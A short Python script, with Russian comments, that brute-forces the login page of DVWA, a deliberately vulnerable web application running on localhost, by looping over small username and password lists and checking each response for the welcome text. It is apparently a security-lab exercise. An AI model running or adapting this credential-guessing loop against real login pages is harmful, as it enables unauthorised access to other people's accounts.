import requests

url = 'http://localhost/DVWA/vulnerabilities/brute/'
usernames = ['admin', 'user', 'test', 'USER']  # Возможные имена пользователей
passwords = ['password', '12345', 'qwerty', 'PASS']  # Возможные пароли
user_token = 'TOKEN'  # Ваш токен безопасности
#username=USER&password=PASS&user_token=TOKEN&Login=Login
def brute_force():
    for username in usernames:
        for password in passwords:
            params = {
                'username': username,
                'password': password,
                'user_token': user_token,
                'Login': 'Login'
            }

            response = requests.get(url, params=params)

            if 'Welcome to the password protected area' in response.text:
                print(f"Успех! Имя пользователя: {username}, Пароль: {password}")
                return

    print("Комбинации не найдены.")
    
brute_force()